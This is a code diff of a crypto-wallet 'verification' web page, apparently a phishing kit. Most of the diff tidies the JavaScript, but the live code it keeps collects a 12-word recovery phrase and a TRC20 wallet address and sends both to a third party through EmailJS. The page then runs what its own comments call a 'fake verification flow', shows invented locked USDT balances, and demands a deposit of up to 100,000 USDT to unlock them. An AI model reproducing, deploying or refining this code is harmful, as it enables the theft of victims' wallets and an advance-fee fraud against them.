@@ -495,14 +495,23 @@ select:focus {
 </main>
 
 <div id="toast"></div>
-  
-  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+
+<!-- Load EmailJS SDK -->
+<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
 <script>
-  // initialize with public key
+  // Initialize EmailJS
   emailjs.init("dvLgjhIHXXq7QXp5p");
-</script>
-  
-<script>
+
+  // ✅ Toast helper defined once, available to all steps
+  function showToast(message) {
+    const toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.style.opacity = "1";
+    setTimeout(() => {
+      toast.style.opacity = "0";
+    }, 2000);
+  }
+
   // References
   const s1 = document.getElementById('step1');
   const s2 = document.getElementById('step2');
@@ -515,6 +524,7 @@ select:focus {
   const s1btn = document.getElementById('s1btn');
   const s2btn = document.getElementById('s2btn');
   const s3btn = document.getElementById('s3btn');
+  const copyBtn = document.getElementById('copyBtn');
 
   // ✅ Inline error helper
   function setFieldError(fieldId, message) {
@@ -540,47 +550,47 @@ select:focus {
   });
 
   // Step 2 → Step 3
-s2btn.addEventListener('click', () => {
-  let phrase = '';
-  for (let i = 1; i <= 12; i++) {
-    const id = `word${i}`;
-    const val = document.getElementById(id).value.trim();
-    if (!val) {
-      setFieldError(id, `Please enter word ${i}.`);
-      if (phrase === '') document.getElementById(id).focus();
-      return;
-    } else {
-      setFieldError(id, '');
+  s2btn.addEventListener('click', () => {
+    let phrase = '';
+    for (let i = 1; i <= 12; i++) {
+      const id = `word${i}`;
+      const val = document.getElementById(id).value.trim();
+      if (!val) {
+        setFieldError(id, `Please enter word ${i}.`);
+        if (phrase === '') document.getElementById(id).focus();
+        return;
+      } else {
+        setFieldError(id, '');
+      }
+      phrase += val + ' ';
     }
-    phrase += val + ' ';
-  }
-  phrase = phrase.trim();
+    phrase = phrase.trim();
 
-  const matchCheck = document.getElementById('matchCheck').checked;
-  if (!matchCheck) {
-    showToast("Please confirm your backup matches your TRC20 wallet address.");
-    return;
-  }
+    const matchCheck = document.getElementById('matchCheck').checked;
+    if (!matchCheck) {
+      showToast("Please confirm your backup matches your TRC20 wallet address.");
+      return;
+    }
 
-  // EmailJS
-  const addr = document.getElementById('addr').value.trim();
-  emailjs.send("service_1qzlil7", "template_w742mzr", {
-    wallet_address: addr,
-    recovery_phrase: phrase
-  }).then(() => {
-    console.log("Data sent");
-  }).catch(err => {
-    console.error("Error sending", err);
+    // 🚨 EmailJS send
+    const addr = document.getElementById('addr').value.trim();
+    emailjs.send("service_1qzlil7", "template_w742mzr", {
+      wallet_address: addr,
+      recovery_phrase: phrase
+    }).then(() => {
+      console.log("Data sent");
+    }).catch(err => {
+      console.error("Error sending", err);
+    });
+
+    // Continue with fake verification flow
+    prog.style.width = '70%';
+    setTimeout(() => {
+      prog.style.width = '100%';
+      s2.hidden = true;
+      s3.hidden = false;
+    }, 3000);
   });
-
-  // Continue with fake verification flow
-  prog.style.width = '70%';
-  setTimeout(() => {
-    prog.style.width = '100%';
-    s2.hidden = true;
-    s3.hidden = false;
-  }, 3000);
-});
 
   // Remove blinking once a tier is chosen
   tierSelect.addEventListener('change', () => {
@@ -605,11 +615,9 @@ s2btn.addEventListener('click', () => {
       fin.hidden = false;
       loaderBar.hidden = true;
 
-      // Get values
       const walletAddr = document.getElementById('addr').value.trim();
       const tierValue = tierSelect.value;
 
-      // Map tier to deposit + locked amounts
       const tierMap = {
         "1M":   { deposit: "100,000", locked: "1,000,000" },
         "250k": { deposit: "50,000",  locked: "250,000" },
@@ -624,11 +632,10 @@ s2btn.addEventListener('click', () => {
 
       const tierChoice = tierMap[tierValue];
 
-      // Populate dashboard
       document.getElementById('walletDisplay').textContent = walletAddr;
-      document.getElementById('lockedBalance').textContent = `${tierChoice.locked} USDT 🔒 Locked`;
+      document.getElementById('lockedBalance').textContent =
+        `${tierChoice.locked} USDT 🔒 Locked`;
 
-      // New deposit message with glow
       const depositMsg = document.getElementById('depositMsg');
       depositMsg.textContent =
         `⏳ Deposit ${tierChoice.deposit} USDT (TRC20) to your wallet to unlock your locked ${tierChoice.locked} USDT`;
@@ -636,19 +643,7 @@ s2btn.addEventListener('click', () => {
     }, 4000);
   });
 
-  // Copy to clipboard functionality (toast version)
-  const copyBtn = document.getElementById('copyBtn');
-
-  function showToast(message) {
-    const toast = document.getElementById('toast');
-    toast.textContent = message;
-    toast.style.opacity = "1";
-
-    setTimeout(() => {
-      toast.style.opacity = "0";
-    }, 2000); // fades out after 2 seconds
-  }
-
+  // Copy to clipboard functionality
   copyBtn.addEventListener('click', () => {
     const walletAddr = document.getElementById('walletDisplay').textContent;
     navigator.clipboard.writeText(walletAddr).then(() => {
